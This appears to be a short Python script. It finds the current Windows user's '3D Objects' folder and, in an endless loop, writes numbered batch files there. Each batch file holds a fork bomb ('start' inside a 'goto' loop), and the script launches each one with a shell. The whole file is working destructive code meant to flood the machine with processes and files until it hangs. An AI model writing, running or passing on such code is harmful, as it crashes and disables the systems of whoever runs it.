import subprocess
import getpass
import os

userid ="C:\\Users\\"
username = getpass.getuser()

def CSI3Dobjects(x):
    global userid
    Dobject = (R"\3D Objects\\")
    total = str(userid) + str(username) + str(Dobject)
    if os.path.exists(total):
        x = 0
        while True:  
            x = x + 1
            f = open((str(total)+str(x)+'.bat'),"w+")
            f.write("""
            :a
            start
            goto a
                """)
            f.close
            subprocess.Popen((str(total))+(str(x)+'.bat'), shell=True)
    else:
        print("Code: 43")


